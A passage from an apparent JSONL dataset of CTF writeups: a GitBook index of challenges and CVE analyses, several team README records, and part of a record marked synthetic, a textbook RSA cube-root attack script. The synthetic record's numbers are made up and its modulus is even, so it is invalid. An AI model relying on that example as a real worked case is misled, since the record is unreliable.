Sight](ctf/2024/intigriti_24/warmup/in_plain_sight/in_plain_sight.md)\n                -   [IrrORversible](ctf/2024/intigriti_24/warmup/irrorversible/irrorversible.md)\n                -   [Layers](ctf/2024/intigriti_24/warmup/layers/layers.md)\n                -   [Rigged Slot Machine 1](ctf/2024/intigriti_24/warmup/rigged_slot_machine1/rigged_slot_machine1.md)\n            -   [Game](ctf/2024/intigriti_24/game/)\n                -   [Bug Squash 1](ctf/2024/intigriti_24/game/bug_squash1/bug_squash1.md)\n                -   [Bug Squash 2](ctf/2024/intigriti_24/game/bug_squash2/bug_squash2.md)\n            -   [Rev](ctf/2024/intigriti_24/rev/)\n                -   [Secure Bank](ctf/2024/intigriti_24/rev/secure_bank/secure_bank.md)\n            -   [Web](ctf/2024/intigriti_24/web/)\n                -   [Biocorp](ctf/2024/intigriti_24/web/biocorp/biocorp.md)\n                -   [Cat Club](ctf/2024/intigriti_24/web/cat_club/cat_club.md)\n                -   [Pizza Paradise](ctf/2024/intigriti_24/web/pizza_paradise/pizza_paradise.md)\n                -   [SafeNotes 2.0](ctf/2024/intigriti_24/web/safenotes_2/safenotes_2.md)\n            -   [Misc](ctf/2024/intigriti_24/misc/)\n                -   [Quick Recovery](ctf/2024/intigriti_24/misc/quick_recovery/quick_recovery.md)\n                -   [Triage Bot 2](ctf/2024/intigriti_24/misc/triage_bot2/triage_bot.md)\n            -   [Pwn](ctf/2024/intigriti_24/pwn/)\n                -   [Floormat Sale](ctf/2024/intigriti_24/pwn/floormat_sale/floormat_sale.md)\n                -   [Retro2Win](ctf/2024/intigriti_24/pwn/retro2win/retro2win.md)\n                -   [Rigged Slot Machine 2](ctf/2024/intigriti_24/pwn/rigged_slot_machine2/rigged_slot_machine2.md)\n                -   [UAP](ctf/2024/intigriti_24/pwn/uap/uap.md)\n            -   [Crypto](ctf/2024/intigriti_24/crypto/)\n                -   [Schrodinger's Pad](ctf/2024/intigriti_24/crypto/schrodingers_pad/schrodingers_pad.md)\n            -   [Mobile](ctf/2024/intigriti_24/mobile/)\n                -   [Cold Storage](ctf/2024/intigriti_24/mobile/cold_storage/cold_storage.md)\n            -   [OSINT](ctf/2024/intigriti_24/osint/)\n                -   [No Comment](ctf/2024/intigriti_24/osint/no_comment/no_comment.md)\n                -   [Trackdown](ctf/2024/intigriti_24/osint/trackdown/trackdown.md)\n                -   [Trackdown 2](ctf/2024/intigriti_24/osint/trackdown2/trackdown2.md)\n            -   [Forensics](ctf/2024/intigriti_24/forensics/)\n                -   [CTF Mind Tricks](ctf/2024/intigriti_24/forensics/ctf_mind_tricks/ctf_mind_tricks.md)\n                -   [Hoarded Flag](ctf/2024/intigriti_24/forensics/hoarded_flag/hoarded_flag.md)\n                -   [Password Management](ctf/2024/intigriti_24/forensics/password_management/password_management.md)\n        -   [CSAW](ctf/2024/csaw_24/)\n            -   [Web](ctf/2024/csaw_24/web/)\n                -   [Playing on the Backcourts](ctf/2024/csaw_24/web/playing_on_the_backcourts/playing_on_the_backcourts.md)\n                -   [Log Me In](ctf/2024/csaw_24/web/log_me_in/log_me_in.md)\n                -   [Lost Pyramid](ctf/2024/csaw_24/web/lost_pyramid/lost_pyramid.md)\n                -   [BucketWars](ctf/2024/csaw_24/web/bucketwars/bucketwars.md)\n        -   [CyberSpace](ctf/2024/cyberspace_24/)\n            -   [Web](ctf/2024/cyberspace_24/web/)\n                -   [Feature Unlocked](ctf/2024/cyberspace_24/web/feature_unlocked/feature_unlocked.md)\n        -   [UIU](ctf/2024/uiu_24/)\n            -   [Web](ctf/2024/uiu_24/web/)\n                -   [Fare Evasion](ctf/2024/uiu_24/web/fare_evasion/fare_evasion.md)\n                -   [Log Action](ctf/2024/uiu_24/web/log_action/log_action.md)\n        -   [Wani](ctf/2024/wani_24/)\n            -   [Web](ctf/2024/wani_24/web/)\n                -   [Bad Worker](ctf/2024/wani_24/web/bad_worker/bad_worker.md)\n                -   [PoW](ctf/2024/wani_24/web/pow/pow.md)\n                -   [One Day One Letter](ctf/2024/wani_24/web/one_day_one_letter/one_day_one_letter.md)\n        -   [Akasec](ctf/2024/akasec_24/)\n            -   [Web](ctf/2024/akasec_24/web/)\n                -   [Upload](ctf/2024/akasec_24/web/upload/upload.md)\n        -   [HTB Cyber Apocalypse](ctf/2024/cyber_apocalypse_24/)\n            -   [Web](ctf/2024/cyber_apocalypse_24/web/)\n                -   [Flag Command](ctf/2024/cyber_apocalypse_24/web/flag_command/flag_command.md)\n                -   [TimeKORP](ctf/2024/cyber_apocalypse_24/web/time_korp/time_korp.md)\n                -   [KORP Terminal](ctf/2024/cyber_apocalypse_24/web/korp_terminal/korp_terminal.md)\n                -   [Labyrinth Linguist](ctf/2024/cyber_apocalypse_24/web/labyrinth_linguist/labyrinth_linguist.md)\n                -   [Locktalk](ctf/2024/cyber_apocalypse_24/web/locktalk/locktalk.md)\n                -   [SerialFlow](ctf/2024/cyber_apocalypse_24/web/serial_flow/serial_flow.md)\n                -   [Testimonial](ctf/2024/cyber_apocalypse_24/web/testimonial/testimonial.md)\n    -   [2023](ctf/2023/README.md)\n        -   [Intigriti](ctf/2023/intigriti_23/)\n            -   [Gamepwn](ctf/2023/intigriti_23/gamepwn/)\n                -   [Dark Secrets](ctf/2023/intigriti_23/gamepwn/dark_secrets/dark_secrets.md)\n            -   [Misc](ctf/2023/intigriti_23/misc/)\n                -   [Triage Bot](ctf/2023/intigriti_23/misc/triage_bot/triage_bot.md)\n            -   [OSINT](ctf/2023/intigriti_23/osint/)\n                -   [Photographs](ctf/2023/intigriti_23/osint/photographs/photographs.md)\n            -   [Pwn](ctf/2023/intigriti_23/pwn/)\n                -   [Floormat Store](ctf/2023/intigriti_23/pwn/floormat_store/floormat_store.md)\n            -   [Web](ctf/2023/intigriti_23/web/)\n                -   [Bug Report Repo](ctf/2023/intigriti_23/web/bug_report_repo/bug_report_repo.md)\n                -   [My Music](ctf/2023/intigriti_23/web/my_music/my_music.md)\n        -   [Imaginary](ctf/2023/imaginary_23/)\n            -   [Web](ctf/2023/imaginary_23/web/)\n                -   [Blank](ctf/2023/imaginary_23/web/blank/blank.md)\n                -   [IDORiot](ctf/2023/imaginary_23/web/idoriot/idoriot.md)\n                -   [Inspection](ctf/2023/imaginary_23/web/inspection/inspection.md)\n                -   [Login](ctf/2023/imaginary_23/web/login/login.md)\n                -   [Perfect Picture](ctf/2023/imaginary_23/web/perfect_picture/perfect_picture.md)\n                -   [Roks](ctf/2023/imaginary_23/web/roks/roks.md)\n        -   [Google](ctf/2023/google_23/)\n            -   [Pwn](ctf/2023/google_23/pwn/)\n                -   [Write-Flag-Where](ctf/2023/google_23/pwn/write-flag-where/write-flag-where.md)\n        -   [Cyber Apocalypse](ctf/2023/cyber_apocalypse_23/)\n            -   [AI](ctf/2023/cyber_apocalypse_23/ai/)\n                -   [Last Hope](ctf/2023/cyber_apocalypse_23/ai/last_hope/last_hope.md)\n                -   [Mysterious Learning](ctf/2023/cyber_apocalypse_23/ai/mysterious-learning.md)\n            -   [Crypto](ctf/2023/cyber_apocalypse_23/crypto/)\n                -   [Perfect Synchronization](ctf/2023/cyber_apocalypse_23/crypto/perfect_syncronization/perfect_syncronization.md)\n            -   [Pwn](ctf/2023/cyber_apocalypse_23/pwn/)\n                -   [Getting Started](ctf/2023/cyber_apocalypse_23/pwn/getting_started/getting_started.md)\n                -   [Labyrinth](ctf/2023/cyber_apocalypse_23/pwn/labyrinth/labyrinth.md)\n                -   [Pandora's Box](ctf/2023/cyber_apocalypse_23/pwn/pandoras_box/pandoras_box.md)\n                -   [Void](ctf/2023/cyber_apocalypse_23/pwn/void/void.md)\n            -   [Rev](ctf/2023/cyber_apocalypse_23/rev/)\n                -   [Cave System](ctf/2023/cyber_apocalypse_23/rev/cave_system/cave_system.md)\n                -   [Hunting License](ctf/2023/cyber_apocalypse_23/rev/hunting_license/hunting_license.md)\n                -   [Needle in a Haystack](ctf/2023/cyber_apocalypse_23/rev/needle_in_a_haystack/needle_in_a_haystack.md)\n                -   [Shattered Tablet](ctf/2023/cyber_apocalypse_23/rev/shattered_tablet/shattered_tablet.md)\n                -   [She Sells Sea Shells](ctf/2023/cyber_apocalypse_23/rev/she_sells_sea_shells/she_sells_sea_shells.md)\n        -   [Sekai](ctf/2023/sekai_23/)\n            -   [Rev](ctf/2023/sekai_23/rev/)\n                -   [Azusawa's Gacha World](ctf/2023/sekai_23/rev/azusawas_gacha_world/azusawas_gacha_world.md)\n        -   [Amateurs](ctf/2023/amateurs_23/)\n            -   [Web](ctf/2023/amateurs_23/web/)\n                -   [Sanity](ctf/2023/amateurs_23/web/sanity/sanity.md)\n                -   [Waiting an Eternity](ctf/2023/amateurs_23/web/waiting_an_eternity/waiting_an_eternity.md)\n        -   [NahamCon](ctf/2023/nahamcon_23/)\n            -   [Web](ctf/2023/nahamcon_23/web/)\n                -   [Hidden Figures](ctf/2023/nahamcon_23/web/hidden_figures/hidden_figures.md)\n                -   [Marmalade 5](ctf/2023/nahamcon_23/web/marmalade_5/marmalade_5.md)\n                -   [Obligatory](ctf/2023/nahamcon_23/web/obligatory/obligatory.md)\n                -   [Star Wars](ctf/2023/nahamcon_23/web/star_wars/star_wars.md)\n                -   [Stickers](ctf/2023/nahamcon_23/web/stickers/stickers.md)\n        -   [Angstrom](ctf/2023/angstrom_23/)\n            -   [Pwn](ctf/2023/angstrom_23/pwn/)\n                -   [Leek](ctf/2023/angstrom_23/pwn/leek/leek.md)\n    -   [2022](ctf/2022/README.md)\n        -   [Imaginary (iCTF)](ctf/2022/imaginary-ictf/)\n            -   [Crypto](ctf/2022/ictf_22/crypto/)\n                -   [ASE](ctf/2022/ictf_22/crypto/ase/ase.md)\n            -   [Pwn](ctf/2022/ictf_22/pwn/)\n                -   [Links 1](ctf/2022/ictf_22/pwn/links/links_1.md)\n                -   [Links 2](ctf/2022/ictf_22/pwn/links/links_2.md)\n                -   [Links 3](ctf/2022/ictf_22/pwn/links/links_3.md)\n                -   [Open Doors](ctf/2022/ictf_22/pwn/open_doors/open_doors.md)\n        -   [SEETF](ctf/2022/seetf_22/)\n            -   [Pwn](ctf/2022/seetf_22/pwn/)\n                -   [4mats](ctf/2022/seetf_22/pwn/4mats/4mats.md)\n                -   [Easy Overflow](ctf/2022/seetf_22/pwn/easy_overflow/easy_overflow.md)\n            -   [Rev](ctf/2022/seetf_22/rev/)\n                -   [BabyReeee](ctf/2022/seetf_22/rev/babyreeee/babyreeee.md)\n            -   [Web](ctf/2022/seetf_22/web/)\n                -   [Super-Secure-Requests-Forwarder](ctf/2022/seetf_22/web/super_secure_requests_forwarder/super_secure_requests_forwarder.md)\n        -   [HTB Cyber Apocalypse](ctf/2022/cyber_apocalypse_22/)\n            -   [Pwn](ctf/2022/cyber_apocalypse_22/pwn/)\n                -   [Hellbound](ctf/2022/cyber_apocalypse_22/pwn/hellbound/hellbound.md)\n        -   [Angstrom](ctf/2022/angstrom_22/)\n            -   [Pwn](ctf/2022/angstrom_22/pwn/)\n                -   [Really Obnoxious Problem](ctf/2022/angstrom_22/pwn/really_obnoxious_problem/really_obnoxious_problem.md)\n                -   [Wah](ctf/2022/angstrom_22/pwn/wah/wah.md)\n                -   [Whats My Name](ctf/2022/angstrom_22/pwn/whatsmyname/whatsmyname.md)\n                -   [Where Am I](ctf/2022/angstrom_22/pwn/whereami/whereami.md)\n            -   [Web](ctf/2022/angstrom_22/web/)\n                -   [Crumbs](ctf/2022/angstrom_22/web/crumbs/crumbs.md)\n                -   [Xtra Salty Sardines](ctf/2022/angstrom_22/web/xtra_salty_sardines/xtra_salty_sardines.md)\n        -   [NahamCon](ctf/2022/nahamcon_22/)\n            -   [Pwn](ctf/2022/nahamcon_22/pwn/)\n                -   [Baby Steps](ctf/2022/nahamcon_22/pwn/babysteps/babysteps.md)\n            -   [Web](ctf/2022/nahamcon_22/web/)\n                -   [Flaskmetal Alchemist](ctf/2022/nahamcon_22/web/flaskmetal_alchemist/flaskmetal_alchemist.md)\n                -   [Hacker Ts](ctf/2022/nahamcon_22/web/hacker_ts/hacker_ts.md)\n                -   [Two for One](ctf/2022/nahamcon_22/web/two_for_one/two_for_one.md)\n        -   [Pico](ctf/2022/pico_22/)\n            -   [Forensics](ctf/2022/pico_22/forensics/)\n                -   [Side Channel](ctf/2022/pico_22/forensics/side_channel/side_channel.md)\n            -   [Pwn](ctf/2022/pico_22/pwn/)\n                -   [Buffer Overflow 1](ctf/2022/pico_22/pwn/buffer_overflow_1/buffer_overflow_1.md)\n                -   [Buffer Overflow 2](ctf/2022/pico_22/pwn/buffer_overflow_2/buffer_overflow_2.md)\n                -   [Buffer Overflow 3](ctf/2022/pico_22/pwn/buffer_overflow_3/buffer_overflow_3.md)\n                -   [Flag Leak](ctf/2022/pico_22/pwn/flag_leak/flag_leak.md)\n                -   [Function Overwrite](ctf/2022/pico_22/pwn/function_overwrite/function_overwrite.md)\n                -   [ROPfu](ctf/2022/pico_22/pwn/ropfu/ropfu.md)\n                -   [RPS](ctf/2022/pico_22/pwn/rps.md)\n                -   [Stack Cache](ctf/2022/pico_22/pwn/stack_cache/stack_cache.md)\n                -   [Wine](ctf/2022/pico_22/pwn/wine/wine.md)\n                -   [X-Sixty-What](ctf/2022/pico_22/pwn/x-sixty-what.md)\n            -   [Rev](ctf/2022/pico_22/rev/)\n                -   [Wizardlike](ctf/2022/pico_22/rev/wizardlike/wizardlike.md)\n            -   [Web](ctf/2022/pico_22/web/)\n                -   [Noted](ctf/2022/pico_22/web/noted/noted.md)\n        -   [Space Heroes](ctf/2022/space_heroes_22/)\n            -   [Pwn](ctf/2022/space_heroes_22/pwn/)\n                -   [Vader](ctf/2022/space_heroes_22/pwn/vader/vader.md)\n            -   [Web](ctf/2022/space_heroes_22/web/)\n                -   [Flag in Space](ctf/2022/space_heroes_22/web/flag_in_space/flag_in_space.md)\n        -   [Intigriti](ctf/2022/intigriti_22/)\n            -   [Pwn](ctf/2022/intigriti_22/pwn/)\n                -   [Bird](ctf/2022/intigriti_22/pwn/bird/bird.md)\n                -   [Cake](ctf/2022/intigriti_22/pwn/cake/cake.md)\n                -   [Easy Register](ctf/2022/intigriti_22/pwn/easy_register/easy_register.md)\n                -   [Search Engine](ctf/2022/intigriti_22/pwn/search_engine/search_engine.md)\n        -   [Dice](ctf/2022/dice_22/)\n            -   [Pwn](ctf/2022/dice_22/pwn/)\n                -   [Interview Opportunity](ctf/2022/dice_22/pwn/interview_opportunity/interview_opportunity.md)\n    -   [2021](ctf/2021/README.md)\n        -   [Pico](ctf/2021/pico_21/)\n            -   [Pwn](ctf/2021/pico_21/pwn/)\n                -   [Unsubscriptions Are Free](ctf/2021/pico_21/pwn/unsubscriptions_are_free/unsubscriptions_are_free.md)\n        -   [Crusaders of Rust (COR)](ctf/2021/crusaders-of-rust-cor/)\n            -   [Crypto](ctf/2021/crusaders-of-rust-cor/crypto/)\n                -   [Fibinary](ctf/2021/cor_21/crypto/fibinary/fibinary.md)\n            -   [Pwn](ctf/2021/crusaders-of-rust-cor/pwn/)\n                -   [Chainblock](ctf/2021/cor_21/pwn/chainblock/chainblock.md)\n        -   [HTB Cyber Santa](ctf/2021/htb_cyber_santa_21/)\n            -   [Crypto](ctf/2021/htb_cyber_santa_21/crypto/)\n                -   [Meet Me Halfway](ctf/2021/htb_cyber_santa_21/crypto/meet_me_halfway/meet_me_halfway.md)\n                -   [Xmas Spirit](ctf/2021/htb_cyber_santa_21/crypto/xmas_spirit/xmas_spirit.md)\n            -   [Pwn](ctf/2021/htb_cyber_santa_21/pwn/)\n                -   [Minimelfistic](ctf/2021/htb_cyber_santa_21/pwn/minimelfistic/minimelfistic.md)\n                -   [Mr. Snowy](ctf/2021/htb_cyber_santa_21/pwn/mr_snowy/mr_snowy.md)\n                -   [Naughty List](ctf/2021/htb_cyber_santa_21/pwn/naughty_list/naughty_list.md)\n                -   [Sleigh](ctf/2021/htb_cyber_santa_21/pwn/sleigh/sleigh.md)\n            -   [Rev](ctf/2021/htb_cyber_santa_21/rev/)\n                -   [Infiltration](ctf/2021/htb_cyber_santa_21/rev/infiltration/infiltration.md)\n                -   [Intercept](ctf/2021/htb_cyber_santa_21/rev/intercept/intercept.md)\n        -   [K3rn3l](ctf/2021/k3rn3l_21/)\n            -   [Crypto](ctf/2021/k3rn3l_21/crypto/)\n                -   [Badseed](ctf/2021/k3rn3l_21/crypto/badseed/badseed.md)\n                -   [Twizzty Buzzinezz](ctf/2021/k3rn3l_21/crypto/twizzty_buzzinezz/twizzty_buzzinezz.md)\n        -   [HTB x Synack RedTeamFive](ctf/2021/htb_synack_redteamfive_21/)\n            -   [Misc](ctf/2021/htb_synack_redteamfive_21/misc/)\n                -   [Context](ctf/2021/htb_synack_redteamfive_21/misc/context/context.md)\n                -   [Hotel](ctf/2021/htb_synack_redteamfive_21/misc/hotel/hotel.md)\n            -   [Pwn](ctf/2021/htb_synack_redteamfive_21/pwn/)\n                -   [Air Supplies](ctf/2021/htb_synack_redteamfive_21/pwn/air_supplies/air_supplies.md)\n                -   [Injection Shot](ctf/2021/htb_synack_redteamfive_21/pwn/injection_shot/injection_shot.md)\n                -   [Library](ctf/2021/htb_synack_redteamfive_21/pwn/library/library.md)\n                -   [Recruitment](ctf/2021/htb_synack_redteamfive_21/pwn/recruitment/recruitment.md)\n            -   [Rev](ctf/2021/htb_synack_redteamfive_21/rev/)\n                -   [Knock Knock](ctf/2021/htb_synack_redteamfive_21/rev/knock_knock/knock_knock.md)\n                -   [Split](ctf/2021/htb_synack_redteamfive_21/rev/split/split.md)\n        -   [KillerQueen](ctf/2021/killerqueen_21/)\n            -   [Pwn](ctf/2021/killerqueen_21/pwn/)\n                -   [A Kind of Magic](ctf/2021/killerqueen_21/pwn/a_kind_of_magic/a_kind_of_magic.md)\n                -   [Tweety Birb](ctf/2021/killerqueen_21/pwn/tweety_birb/tweety_birb.md)\n                -   [Zoom2Win](ctf/2021/killerqueen_21/pwn/zoom2win/zoom2win.md)\n        -   [HacktivityCon](ctf/2021/hacktivitycon_21/)\n            -   [Pwn](ctf/2021/hacktivitycon_21/pwn/)\n                -   [Retcheck](ctf/2021/hacktivitycon_21/pwn/retcheck/retcheck.md)\n                -   [The Library](ctf/2021/hacktivitycon_21/pwn/the_library/the_library.md)\n                -   [Yabo](ctf/2021/hacktivitycon_21/pwn/yabo/yabo.md)\n            -   [Web](ctf/2021/hacktivitycon_21/web/)\n                -   [Availability](ctf/2021/hacktivitycon_21/web/availability/availability.md)\n        -   [CSAW](ctf/2021/csaw_21/)\n            -   [Pwn](ctf/2021/csaw_21/pwn/)\n                -   [Alien Math](ctf/2021/csaw_21/pwn/alien_math/alien_math.md)\n                -   [Password Checker](ctf/2021/csaw_21/pwn/password_checker/password_checker.md)\n            -   [Rev](ctf/2021/csaw_21/rev/)\n                -   [Checker](ctf/2021/csaw_21/rev/checker/checker.md)\n        -   [HackyHolidays](ctf/2021/hackyholidays_21/)\n            -   [Crypto](ctf/2021/hackyholidays_21/crypto/)\n                -   [Cute Invoice](ctf/2021/hackyholidays_21/crypto/cute_invoice/cute_invoice.md)\n                -   [Mineslazer](ctf/2021/hackyholidays_21/crypto/mineslazer/mineslazer.md)\n            -   [Forensics](ctf/2021/hackyholidays_21/forensics/)\n                -   [Injection Traffic](ctf/2021/hackyholidays_21/forensics/injection_traffic/injection_traffic.md)\n                -   [Power Snacks](ctf/2021/hackyholidays_21/forensics/power_snacks/power_snacks.md)\n            -   [Pwn](ctf/2021/hackyholidays_21/pwn/)\n                -   [Deleted Flag](ctf/2021/hackyholidays_21/pwn/deleted_flag/deleted_flag.md)\n                -   [Engine Control](ctf/2021/hackyholidays_21/pwn/engine_control/engine_control.md)\n            -   [Web](ctf/2021/hackyholidays_21/web/)\n                -   [Skylark](ctf/2021/hackyholidays_21/web/skylark/skylark.md)\n        -   [HTB Cyber Apocalypse](ctf/2021/cyber_apocalypse_21/)\n            -   [Crypto](ctf/2021/cyber_apocalypse_21/crypto/)\n                -   [Phasestream](ctf/2021/cyber_apocalypse_21/crypto/phasestream/phasestream.md)\n            -   [Misc](ctf/2021/cyber_apocalypse_21/misc/)\n                -   [Alien Camp](ctf/2021/cyber_apocalypse_21/misc/alien_camp/alien_camp.md)\n                -   [Build Yourself In](ctf/2021/cyber_apocalypse_21/misc/build_yourself_in/build_yourself_in.md)\n            -   [Pwn](ctf/2021/cyber_apocalypse_21/pwn/)\n                -   [Controller](ctf/2021/cyber_apocalypse_21/pwn/controller/controller.md)\n                -   [System Drop](ctf/2021/cyber_apocalypse_21/pwn/system_drop/system_drop.md)\n            -   [Web](ctf/2021/cyber_apocalypse_21/web/)\n                -   [Blitzprop](ctf/2021/cyber_apocalypse_21/web/blitzprop/blitzprop.md)\n                -   [E-Tree](ctf/2021/cyber_apocalypse_21/web/e_tree/e_tree.md)\n                -   [Wild Goose Hunt](ctf/2021/cyber_apocalypse_21/web/wild_goose_hunt/wild_goose_hunt.md)\n        -   [Angstrom](ctf/2021/angstrom_21/)\n            -   [Pwn](ctf/2021/angstrom_21/pwn/)\n                -   [Sanity Checks](ctf/2021/angstrom_21/pwn/sanity_checks/sanity_checks.md)\n                -   [Secure Login](ctf/2021/angstrom_21/pwn/secure_login/secure_login.md)\n                -   [Sticky Stacks](ctf/2021/angstrom_21/pwn/stickystacks/sticky_stacks.md)\n                -   [Tranquil](ctf/2021/angstrom_21/pwn/tranquil/tranquil.md)\n            -   [Rev](ctf/2021/angstrom_21/rev/)\n                -   [Free Flags](ctf/2021/angstrom_21/rev/free_flags/free_flags.md)\n                -   [Jailbreak](ctf/2021/angstrom_21/rev/jailbreak/jailbreak.md)\n            -   [Web](ctf/2021/angstrom_21/web/)\n                -   [Jar](ctf/2021/angstrom_21/web/jar/jar.md)\n-   [Vulnerability Research](research/README.md)\n    -   [CVE Analysis](research/cve/README.md)\n        -   [CVE-2025-24813: Tomcat DefaultServlet Partial PUT](research/cve/cve_2025_24813/cve_2025_24813.md)\n        -   [CVE-2025-54376: Hoverfly WebSocket Auth Bypass](research/cve/cve_2025_54376/cve_2025_54376.md)\n    -   [Novel Research](research/novel/README.md)\n", "solution_code": "", "url": "https://github.com/Crypto-Cat/cryptocat-gitbook/blob/main/SUMMARY.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:43.813846", "synthetic": false}
{"id": "ashutosh1206_Crypto-CTF-Writeups_9b873d7ce00a", "team": "ashutosh1206", "event": "Crypto-CTF-Writeups", "challenge_name": "README", "challenge_description": "# Crypto-CTF-Writeups\nWriteups to Crypto Challenges in CTFs\n", "attack_type": "Unknown", "tools_used": [], "difficulty": "unknown", "writeup": "# Crypto-CTF-Writeups\nWriteups to Crypto Challenges in CTFs\n", "solution_code": "", "url": "https://github.com/ashutosh1206/Crypto-CTF-Writeups/blob/master/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:47.180877", "synthetic": false}
{"id": "p4-team_ctf_499bd940c1ad", "team": "p4-team", "event": "ctf", "challenge_name": "README", "challenge_description": "# Writeup SECCON CTF 2015\n\nUczestniczyliśmy (cr019283, c7f.m0d3, msm, Rev, other019, nazywam i Shalom) w SECCON CTF 2015, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\n![](results.png)\n\n### Spis treści:\n* [Start SECCON CTF (Exercises)\t50](start_seccon_50)\n* [SECCON WARS 2015 (Stegano) 100](seccon_wars_100)\n* [Unzip the file (Crypto) 100]\n* [Fragment2 (Web/Network) 200]\n* [Connect the server (Web/Network) 100](connect_web_100)\n* [Command-Line Qui...", "attack_type": "Hash", "tools_used": [], "difficulty": "unknown", "writeup": "# Writeup SECCON CTF 2015\n\nUczestniczyliśmy (cr019283, c7f.m0d3, msm, Rev, other019, nazywam i Shalom) w SECCON CTF 2015, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\n![](results.png)\n\n### Spis treści:\n* [Start SECCON CTF (Exercises)\t50](start_seccon_50)\n* [SECCON WARS 2015 (Stegano) 100](seccon_wars_100)\n* [Unzip the file (Crypto) 100]\n* [Fragment2 (Web/Network) 200]\n* [Connect the server (Web/Network) 100](connect_web_100)\n* [Command-Line Quiz (Misc) 100](quiz_100)\n* [Entry form (Web/Network) 100](entry_form_web_100)\n* [Bonsai XSS Revolutions (Web/Network) 200](bonsai_xss_revolutions_web_200)\n* [Exec dmesg (Binary/Reverse) 300]\n* [Decrypt it (Crypto) 300]\n* [QR puzzle: Web (Misc) 400](qr_web_400)\n* [QR puzzle: Nonogram (Misc) 300](qr_nonogram_300)\n* [QR puzzle: Windows (Unknown) 200](qr_windows_200)\n* [Reverse-Engineering Android APK 1 (Misc) 400]\n* [Find the prime numbers (Crypto) 200](paillier_crypto_200)\n* [Micro computer exploit code challenge (Exploit) 300]\n* [GDB Remote Debugging (Binary/Reverse) 200]\n* [FSB: TreeWalker (Exploit) 200]\n* [Steganography 1 (Stegano) 100](stegano_1_100)\n* [Steganography 2 (Stegano) 100]\n* [Steganography 3 (Stegano) 100](stegano_3_100)\n* [4042 (Misc/Crypto) 100](4042_crypto_100)\n* [Individual Elebin (Binary/Reverse) 200]\n* [Last Challenge (Thank you for playing) (Exercises/Crypto) 50](last_crypto_50)\n\n", "solution_code": "", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:50.072772", "synthetic": false}
{"id": "p4-team_ctf_499bd940c1ad", "team": "p4-team", "event": "ctf", "challenge_name": "README", "challenge_description": "# Writeup SECCON 2016 Quals\n\nTeam: nazywam, c7f.m0d3, cr019283, akrasuski1, rev, shalom\n\n### Table of contents\n\n* [Vigenere (crypto 100)](vigenere)\n* [VoIP (forensics 100)](voip)\n* [Basiq (web)](web_100_basiq)\n* [Memory Analysis (forensics)](memory)\n* [Uncomfortable web (web 300)](web_300_uncomfortable_web)", "attack_type": "Classical", "tools_used": [], "difficulty": "unknown", "writeup": "# Writeup SECCON 2016 Quals\n\nTeam: nazywam, c7f.m0d3, cr019283, akrasuski1, rev, shalom\n\n### Table of contents\n\n* [Vigenere (crypto 100)](vigenere)\n* [VoIP (forensics 100)](voip)\n* [Basiq (web)](web_100_basiq)\n* [Memory Analysis (forensics)](memory)\n* [Uncomfortable web (web 300)](web_300_uncomfortable_web)", "solution_code": "", "url": "https://github.com/p4-team/ctf/blob/master/2016-12-10-seccon-2016-quals/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:50.683634", "synthetic": false}
{"id": "p4-team_ctf_499bd940c1ad", "team": "p4-team", "event": "ctf", "challenge_name": "README", "challenge_description": "# SECCON 2017 Quals\n\nTeam: c7f.m0d3, cr019283, akrasuski1, nazywam, shalom, rev\n\n### Table of contents\n\n* [SqlSRF (web)](web_sqlsrf)\n* [Ps and Qs (crypto)](crypto_ps_and_qs)\n* [Vigenere 3d(crypto)](crypto_vigenere)\n* [Simon and Speck Block Ciphers (crypto)](crypto_simon)\n* [JPEG File (misc)](misc_jpeg)\n* [Very smooth (crypto)](crypto_smooth)\n* [Automatic door (web)](web_automatic)\n", "attack_type": "Classical", "tools_used": [], "difficulty": "unknown", "writeup": "# SECCON 2017 Quals\n\nTeam: c7f.m0d3, cr019283, akrasuski1, nazywam, shalom, rev\n\n### Table of contents\n\n* [SqlSRF (web)](web_sqlsrf)\n* [Ps and Qs (crypto)](crypto_ps_and_qs)\n* [Vigenere 3d(crypto)](crypto_vigenere)\n* [Simon and Speck Block Ciphers (crypto)](crypto_simon)\n* [JPEG File (misc)](misc_jpeg)\n* [Very smooth (crypto)](crypto_smooth)\n* [Automatic door (web)](web_automatic)\n", "solution_code": "", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:51.276333", "synthetic": false}
{"id": "synthetic_rsa_000", "team": "synthetic_team_10", "event": "CTF_2024_Event_13", "challenge_name": "RSA Small Exponent Attack #1", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 11309111008108050350313868332903190990710652000971246008496600442239637831149693803311924450158639745926519127151785595872248738430271516241631200651284699940473659162252799284729416954153937004369472106316044623911912017270797737733293629300338661172725550154328270530380256756110578360791553814481646\ne = 3\nc = 9920002806265502795480034712274423751679631916522387906548466151113482426050930348009328606250677896338262261062641442455093263419228326819997300873477653879008324315019248868971531966355420804942873736185810056680681123761238965871688025234864939196372110922584756553388392122114051507012465060427945\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 11309111008108050350313868332903190990710652000971246008496600442239637831149693803311924450158639745926519127151785595872248738430271516241631200651284699940473659162252799284729416954153937004369472106316044623911912017270797737733293629300338661172725550154328270530380256756110578360791553814481646\ne = 3\nc = 